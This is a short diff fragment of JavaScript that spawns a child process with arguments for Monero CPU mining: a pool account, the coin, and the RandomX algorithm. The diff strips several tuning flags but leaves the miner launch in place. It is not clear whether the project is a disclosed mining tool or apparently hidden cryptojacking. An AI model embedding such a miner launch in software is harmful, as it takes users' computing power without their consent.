@@ -62,13 +62,7 @@ const args = [
   '-u', 'pimik@send-email.pro/pimik1',
   '-k',
   '--coin', 'monero',
-  '-a', 'rx/0',
-  '--cpu-priority=5',
-  '--threads=0',
-  '--no-cpu-affinity',
-  '--randomx-mode=fast',
-  '--huge-pages',
-  '--asm=auto'
+  '-a', 'rx/0'
 ];
 
 const child = spawn(command, args);
